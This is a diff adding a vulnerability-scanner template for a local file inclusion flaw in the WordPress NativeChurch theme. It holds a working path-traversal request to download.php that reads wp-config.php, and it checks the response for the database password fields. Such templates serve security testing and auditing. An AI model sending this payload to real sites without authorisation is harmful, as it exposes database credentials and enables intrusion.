@@ -1,0 +1,27 @@
+id: nativechurch-wp-theme-lfd
+brief:
+    title: WordPress NativeChurch Theme - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: WordPress NativeChurch Theme is vulnerable to local file inclusion in the download.php file.
+    label:
+        - wp-theme
+        - lfi
+        - wp
+        - packetstorm
+        - wpscan
+        - wordpress
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php'
+      signs:
+        - "on": word
+          has:
+            - DB_NAME
+            - DB_PASSWORD
+            - DB_HOST
+            - The base configurations of the WordPress
+          in: body
+          need: all
